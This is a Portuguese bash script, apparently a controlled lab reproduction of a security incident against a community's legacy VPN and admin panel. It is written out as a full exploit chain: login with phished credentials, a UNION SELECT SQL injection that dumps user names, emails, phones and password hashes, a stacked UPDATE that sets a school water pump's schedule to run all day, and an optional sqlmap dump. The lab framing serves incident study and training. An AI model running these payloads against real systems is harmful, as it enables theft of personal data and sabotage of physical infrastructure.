#!/usr/bin/env bash
# Reprodução CONTROLADA do INC-VA-0712 - roda SOMENTE no container "atacante" do laboratório.
# uso: inc_va_0712.sh <usuario_capturado> <senha_capturada> [--sqlmap]
# Alvo: VPN legada (só senha) -> painel legado vulnerável a SQL Injection.
set -u
U="$1"; P="$2"; SQLMAP="${3:-}"
ALVO="http://vpn-legada:8080"
OUT="/resultados/ataque-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUT"; J="$OUT/cookies.txt"
passo() { echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) | $1" | tee -a "$OUT/diario_atacante.txt"; }

passo "T1566.002 Phishing: credenciais de '$U' obtidas na página falsa (simulado)"
passo "T1078/T1133 Login na VPN legada com credencial válida a partir de IP externo (cenário: 02h14)"
curl -s -c "$J" -o "$OUT/01_vpn_login.txt" -w "HTTP %{http_code}\n" -d "usuario=$U&senha=$P" "$ALVO/vpn/login" | tee -a "$OUT/diario_atacante.txt"

passo "T1190 Teste de injeção (aspa simples) no campo de busca do histórico de acessos"
curl -s -b "$J" -o "$OUT/02_erro_sql.html" -w "HTTP %{http_code}\n" --get --data-urlencode "busca='" "$ALVO/acessos" | tee -a "$OUT/diario_atacante.txt"
grep -o 'syntax error[^<]*' "$OUT/02_erro_sql.html" | head -1 | tee -a "$OUT/diario_atacante.txt"

passo "T1190/T1005 UNION SELECT: extração da tabela de usuários (dados de voluntários e moradores)"
PAY="zzz' UNION SELECT login, nome, email, telefone, senha_md5_legado FROM usuarios -- "
curl -s -b "$J" -o "$OUT/03_dump_usuarios.html" -w "HTTP %{http_code}\n" --get --data-urlencode "busca=$PAY" "$ALVO/acessos" | tee -a "$OUT/diario_atacante.txt"
N=$(grep -o '@vilaaurora.example' "$OUT/03_dump_usuarios.html" | wc -l)
passo "    -> $N registros de usuários vazados (e-mail, telefone, hash MD5)"

passo "T1565.001/T0831 Consulta empilhada: altera o agendamento da bomba da escola para 00:00-23:59"
PAY2="zzz'; UPDATE agendamento_bomba SET hora_inicio='00:00', hora_fim='23:59', atualizado_por='sistema' WHERE espaco='escola'; -- "
curl -s -b "$J" -o "$OUT/04_update_bomba.html" -w "HTTP %{http_code}\n" --get --data-urlencode "busca=$PAY2" "$ALVO/acessos" | tee -a "$OUT/diario_atacante.txt"
curl -s -b "$J" "$ALVO/bomba" -o "$OUT/05_bomba_depois.html"
passo "    -> agendamento atual: $(sed -e 's/<[^>]*>/ /g' "$OUT/05_bomba_depois.html" | tr -s ' ' | tail -c 200)"

if [ "$SQLMAP" = "--sqlmap" ]; then
  passo "Ferramenta automatizada: sqlmap (somente no laboratório)"
  COOKIE=$(awk '$6=="vpn"{print "vpn="$7}' "$J")
  sqlmap -u "$ALVO/acessos?busca=x" --cookie="$COOKIE" -p busca --dbms=PostgreSQL --batch --level 2 \
         -T usuarios -C login,email,telefone --dump --output-dir="$OUT/sqlmap" 2>&1 | tail -40 > "$OUT/06_sqlmap.txt"
  tail -25 "$OUT/06_sqlmap.txt"
fi
passo "Fim da reprodução. Evidências do lado do atacante em $OUT"
